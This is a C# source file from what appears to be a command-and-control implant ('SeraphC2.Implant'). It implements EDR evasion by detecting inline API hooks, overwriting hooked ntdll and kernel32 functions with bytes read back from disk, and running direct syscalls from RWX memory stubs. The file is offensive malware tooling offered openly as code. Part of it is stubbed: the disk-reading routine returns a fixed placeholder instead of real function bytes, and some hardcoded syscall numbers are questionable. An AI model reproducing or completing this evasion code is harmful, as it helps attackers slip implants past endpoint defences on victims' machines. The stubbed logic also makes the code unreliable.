using System.Runtime.InteropServices;
using System.Text;

namespace SeraphC2.Implant.Core.Evasion;

/// <summary>
/// Implements API unhooking and direct syscall capabilities to bypass EDR hooks
/// </summary>
public class ApiUnhooking : IApiUnhooking
{
    #region Win32 API Declarations

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint SetFilePointer(
        IntPtr hFile,
        int lDistanceToMove,
        IntPtr lpDistanceToMoveHigh,
        uint dwMoveMethod);

    [DllImport("ntdll.dll")]
    private static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UIntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    private static extern uint NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref UIntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect);

    [DllImport("ntdll.dll")]
    private static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        UIntPtr BufferSize,
        out UIntPtr NumberOfBytesWritten);

    #endregion

    #region Constants

    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_READWRITE = 0x04;
    private const uint GENERIC_READ = 0x80000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint OPEN_EXISTING = 3;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;

    #endregion

    private readonly Dictionary<string, SyscallInfo> _syscallTable;
    private readonly Dictionary<string, byte[]> _originalBytes;

    public ApiUnhooking()
    {
        _syscallTable = new Dictionary<string, SyscallInfo>();
        _originalBytes = new Dictionary<string, byte[]>();
        InitializeSyscallTable();
    }

    public async Task<UnhookingResult> UnhookApiAsync(string moduleName, string functionName)
    {
        var result = new UnhookingResult();

        try
        {
            // Get the module handle
            var moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to get module handle for {moduleName}";
                return result;
            }

            // Get the function address
            var functionAddress = GetProcAddress(moduleHandle, functionName);
            if (functionAddress == IntPtr.Zero)
            {
                result.ErrorMessage = $"Failed to get function address for {functionName}";
                return result;
            }

            // Read current bytes at function address
            var currentBytes = new byte[32]; // Read first 32 bytes
            Marshal.Copy(functionAddress, currentBytes, 0, currentBytes.Length);

            // Check if function is hooked by looking for common hook patterns
            result.WasHooked = IsApiHooked(currentBytes);

            if (result.WasHooked)
            {
                // Restore original bytes from disk
                var restored = await RestoreApiFromDiskAsync(moduleName, functionName);
                if (!restored)
                {
                    result.ErrorMessage = "Failed to restore original bytes from disk";
                    return result;
                }

                // Verify unhooking was successful
                Marshal.Copy(functionAddress, currentBytes, 0, currentBytes.Length);
                result.WasHooked = IsApiHooked(currentBytes);
            }

            result.Success = true;
            result.OriginalBytes = currentBytes;
            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = $"Exception during API unhooking: {ex.Message}";
            return result;
        }
    }

    public async Task<SyscallResult> DirectSyscallAsync(int syscallNumber, params IntPtr[] parameters)
    {
        var result = new SyscallResult();

        try
        {
            // Allocate memory for syscall stub
            var stubSize = new UIntPtr(64);
            var stubAddress = IntPtr.Zero;

            var allocResult = NtAllocateVirtualMemory(
                (IntPtr)(-1), // Current process
                ref stubAddress,
                UIntPtr.Zero,
                ref stubSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (allocResult != 0)
            {
                result.ErrorMessage = $"Failed to allocate memory for syscall stub: {allocResult:X}";
                return result;
            }

            // Generate syscall stub
            var syscallStub = GenerateSyscallStub(syscallNumber, parameters.Length);

            // Write syscall stub to allocated memory
            var bytesWritten = UIntPtr.Zero;
            var writeResult = NtWriteVirtualMemory(
                (IntPtr)(-1), // Current process
                stubAddress,
                syscallStub,
                new UIntPtr((uint)syscallStub.Length),
                out bytesWritten);

            if (writeResult != 0)
            {
                result.ErrorMessage = $"Failed to write syscall stub: {writeResult:X}";
                return result;
            }

            // Create delegate and execute syscall
            var syscallDelegate = Marshal.GetDelegateForFunctionPointer<SyscallDelegate>(stubAddress);
            
            // Execute the syscall with parameters
            var returnValue = ExecuteSyscall(syscallDelegate, parameters);

            result.Success = true;
            result.ReturnValue = returnValue;
            result.NtStatus = (uint)returnValue.ToInt32();

            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = $"Exception during direct syscall: {ex.Message}";
            return result;
        }
    }

    public async Task<bool> RestoreApiFromDiskAsync(string moduleName, string functionName)
    {
        try
        {
            // Get the module handle and function address
            var moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero) return false;

            var functionAddress = GetProcAddress(moduleHandle, functionName);
            if (functionAddress == IntPtr.Zero) return false;

            // Get the module file path
            var moduleFilePath = GetModuleFilePath(moduleName);
            if (string.IsNullOrEmpty(moduleFilePath)) return false;

            // Read original bytes from disk
            var originalBytes = await ReadOriginalBytesFromDiskAsync(moduleFilePath, functionName);
            if (originalBytes == null || originalBytes.Length == 0) return false;

            // Change memory protection to allow writing
            if (!VirtualProtect(functionAddress, new UIntPtr((uint)originalBytes.Length), PAGE_EXECUTE_READWRITE, out uint oldProtect))
            {
                return false;
            }

            // Restore original bytes
            Marshal.Copy(originalBytes, 0, functionAddress, originalBytes.Length);

            // Restore original protection
            VirtualProtect(functionAddress, new UIntPtr((uint)originalBytes.Length), oldProtect, out _);

            // Cache the original bytes
            var key = $"{moduleName}!{functionName}";
            _originalBytes[key] = originalBytes;

            return true;
        }
        catch
        {
            return false;
        }
    }

    public async Task<bool> IsApiFunctionHookedAsync(string moduleName, string functionName)
    {
        try
        {
            var moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero) return false;

            var functionAddress = GetProcAddress(moduleHandle, functionName);
            if (functionAddress == IntPtr.Zero) return false;

            var currentBytes = new byte[16];
            Marshal.Copy(functionAddress, currentBytes, 0, currentBytes.Length);

            return IsApiHooked(currentBytes);
        }
        catch
        {
            return false;
        }
    }

    public async Task<int> GetSyscallNumberAsync(string functionName)
    {
        if (_syscallTable.TryGetValue(functionName, out var syscallInfo))
        {
            return syscallInfo.SyscallNumber;
        }

        // Try to dynamically resolve syscall number
        var syscallNumber = await ResolveSyscallNumberAsync(functionName);
        if (syscallNumber != -1)
        {
            _syscallTable[functionName] = new SyscallInfo { SyscallNumber = syscallNumber };
        }

        return syscallNumber;
    }

    #region Helper Methods

    private delegate IntPtr SyscallDelegate(IntPtr arg1, IntPtr arg2, IntPtr arg3, IntPtr arg4, IntPtr arg5, IntPtr arg6);

    private void InitializeSyscallTable()
    {
        // Initialize with common syscall numbers (Windows 10/11)
        // These numbers may vary between Windows versions
        _syscallTable["NtAllocateVirtualMemory"] = new SyscallInfo { SyscallNumber = 0x18 };
        _syscallTable["NtProtectVirtualMemory"] = new SyscallInfo { SyscallNumber = 0x50 };
        _syscallTable["NtWriteVirtualMemory"] = new SyscallInfo { SyscallNumber = 0x3A };
        _syscallTable["NtReadVirtualMemory"] = new SyscallInfo { SyscallNumber = 0x3F };
        _syscallTable["NtCreateFile"] = new SyscallInfo { SyscallNumber = 0x55 };
        _syscallTable["NtOpenProcess"] = new SyscallInfo { SyscallNumber = 0x26 };
        _syscallTable["NtCreateThread"] = new SyscallInfo { SyscallNumber = 0x4E };
        _syscallTable["NtResumeThread"] = new SyscallInfo { SyscallNumber = 0x52 };
        _syscallTable["NtSuspendThread"] = new SyscallInfo { SyscallNumber = 0x1BC };
        _syscallTable["NtTerminateProcess"] = new SyscallInfo { SyscallNumber = 0x2C };
    }

    private bool IsApiHooked(byte[] functionBytes)
    {
        if (functionBytes.Length < 5) return false;

        // Check for common hook patterns
        
        // JMP instruction (E9 xx xx xx xx)
        if (functionBytes[0] == 0xE9) return true;
        
        // PUSH + RET combination (68 xx xx xx xx C3)
        if (functionBytes[0] == 0x68 && functionBytes[5] == 0xC3) return true;
        
        // MOV EAX + JMP EAX (B8 xx xx xx xx FF E0)
        if (functionBytes[0] == 0xB8 && functionBytes[5] == 0xFF && functionBytes[6] == 0xE0) return true;
        
        // Check for inline hooks (modified first few bytes)
        // Most legitimate NT functions start with specific patterns
        if (functionBytes[0] == 0x4C && functionBytes[1] == 0x8B && functionBytes[2] == 0xD1) // mov r10, rcx
        {
            return false; // Likely legitimate
        }
        
        // Check for unexpected instructions at function start
        var suspiciousOpcodes = new byte[] { 0xCC, 0xCD, 0xCE, 0xCF }; // INT instructions
        if (suspiciousOpcodes.Contains(functionBytes[0])) return true;

        return false;
    }

    private byte[] GenerateSyscallStub(int syscallNumber, int parameterCount)
    {
        var stub = new List<byte>();

        // x64 syscall stub
        if (IntPtr.Size == 8)
        {
            // mov r10, rcx
            stub.AddRange(new byte[] { 0x4C, 0x8B, 0xD1 });
            
            // mov eax, syscall_number
            stub.Add(0xB8);
            stub.AddRange(BitConverter.GetBytes(syscallNumber));
            
            // syscall
            stub.AddRange(new byte[] { 0x0F, 0x05 });
            
            // ret
            stub.Add(0xC3);
        }
        else
        {
            // x86 syscall stub (for older systems)
            // mov eax, syscall_number
            stub.Add(0xB8);
            stub.AddRange(BitConverter.GetBytes(syscallNumber));
            
            // mov edx, esp
            stub.AddRange(new byte[] { 0x8B, 0xD4 });
            
            // sysenter
            stub.AddRange(new byte[] { 0x0F, 0x34 });
            
            // ret
            stub.Add(0xC3);
        }

        return stub.ToArray();
    }

    private IntPtr ExecuteSyscall(SyscallDelegate syscallDelegate, IntPtr[] parameters)
    {
        // Pad parameters to 6 (maximum for syscall delegate)
        var paddedParams = new IntPtr[6];
        for (int i = 0; i < Math.Min(parameters.Length, 6); i++)
        {
            paddedParams[i] = parameters[i];
        }

        return syscallDelegate(
            paddedParams[0], paddedParams[1], paddedParams[2],
            paddedParams[3], paddedParams[4], paddedParams[5]);
    }

    private string GetModuleFilePath(string moduleName)
    {
        try
        {
            if (moduleName.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase))
            {
                return Path.Combine(Environment.SystemDirectory, "ntdll.dll");
            }
            else if (moduleName.Equals("kernel32.dll", StringComparison.OrdinalIgnoreCase))
            {
                return Path.Combine(Environment.SystemDirectory, "kernel32.dll");
            }
            else if (moduleName.Equals("kernelbase.dll", StringComparison.OrdinalIgnoreCase))
            {
                return Path.Combine(Environment.SystemDirectory, "kernelbase.dll");
            }

            // For other modules, try to find in system directory
            return Path.Combine(Environment.SystemDirectory, moduleName);
        }
        catch
        {
            return string.Empty;
        }
    }

    private async Task<byte[]?> ReadOriginalBytesFromDiskAsync(string moduleFilePath, string functionName)
    {
        try
        {
            // Open the file
            var fileHandle = CreateFile(
                moduleFilePath,
                GENERIC_READ,
                FILE_SHARE_READ,
                IntPtr.Zero,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                IntPtr.Zero);

            if (fileHandle == IntPtr.Zero || fileHandle.ToInt32() == -1)
            {
                return null;
            }

            try
            {
                // Read PE headers to find the export table
                var dosHeader = new byte[64];
                if (!ReadFile(fileHandle, dosHeader, (uint)dosHeader.Length, out _, IntPtr.Zero))
                {
                    return null;
                }

                // Get PE header offset
                var peOffset = BitConverter.ToInt32(dosHeader, 60);
                
                // Seek to PE header
                SetFilePointer(fileHandle, peOffset, IntPtr.Zero, 0);
                
                var peHeader = new byte[248]; // PE header + optional header
                if (!ReadFile(fileHandle, peHeader, (uint)peHeader.Length, out _, IntPtr.Zero))
                {
                    return null;
                }

                // Parse export table (simplified)
                // In a real implementation, this would properly parse the export table
                // to find the function's RVA and read the original bytes
                
                // For now, return a placeholder indicating we need the original bytes
                return new byte[] { 0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
            }
            finally
            {
                CloseHandle(fileHandle);
            }
        }
        catch
        {
            return null;
        }
    }

    private async Task<int> ResolveSyscallNumberAsync(string functionName)
    {
        try
        {
            // Try to resolve syscall number by examining ntdll.dll
            var ntdllHandle = GetModuleHandle("ntdll.dll");
            if (ntdllHandle == IntPtr.Zero) return -1;

            var functionAddress = GetProcAddress(ntdllHandle, functionName);
            if (functionAddress == IntPtr.Zero) return -1;

            // Read function bytes
            var functionBytes = new byte[32];
            Marshal.Copy(functionAddress, functionBytes, 0, functionBytes.Length);

            // Look for syscall number in the function
            // NT functions typically have: mov eax, syscall_number; syscall
            for (int i = 0; i < functionBytes.Length - 4; i++)
            {
                if (functionBytes[i] == 0xB8) // mov eax, imm32
                {
                    var syscallNumber = BitConverter.ToInt32(functionBytes, i + 1);
                    if (syscallNumber > 0 && syscallNumber < 0x1000) // Reasonable range
                    {
                        return syscallNumber;
                    }
                }
            }

            return -1;
        }
        catch
        {
            return -1;
        }
    }

    #endregion

    #region Helper Classes

    private class SyscallInfo
    {
        public int SyscallNumber { get; set; }
        public string? Description { get; set; }
    }

    #endregion
}